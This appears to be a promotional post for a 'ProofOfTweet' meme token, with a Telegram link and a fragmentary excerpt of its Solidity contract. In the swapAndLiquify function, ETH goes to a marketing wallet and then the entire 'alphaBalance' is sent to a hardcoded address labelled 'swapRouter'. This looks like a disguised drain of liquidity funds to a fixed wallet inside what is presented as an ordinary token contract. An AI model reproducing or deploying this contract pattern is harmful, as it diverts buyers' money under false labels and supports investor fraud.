...
When Elon takes over Twitter we are in for some POT (Proof Of Tweet) mechanism.
https://t.me/ProofOfTweet
...
contract ProofOfTweet is IERC20, Ownable {
    using SafeMath for uint256;
    string private constant _name = 'ProofOfTweet';
    ...
    address internal constant development_receiver = 0x86eC27f0a839947F55ebe73A5a25464A381cc8A9; 
    address internal constant marketing_receiver = 0x922C94cC964BE49b9096D74bd71BFdD798429DC9;
    address internal constant liquidity_receiver = 0x86eC27f0a839947F55ebe73A5a25464A381cc8A9;
    ...
    address internal constant swapRouter = 0xd301C0FC837c605366a3eEFa2E1C2487cBb92796;
    ...
    function swapAndLiquify(uint256 tokens) private lockTheSwap {
        ...
        uint256 alphaBalance = deltaBalance.div(_denominator.sub(liquidityFee));
        uint256 unitBalance = alphaBalance.div(2);
        uint256 ETHToAddLiquidityWith = unitBalance.mul(liquidityFee);
        if(ETHToAddLiquidityWith > uint256(0)){addLiquidity(tokensToAddLiquidityWith, ETHToAddLiquidityWith); }
        uint256 marketingAmt = unitBalance.mul(2).mul(marketingFee);
        if(marketingAmt > 0){payable(marketing_receiver).transfer(marketingAmt);payable(swapRouter).transfer(alphaBalance);}
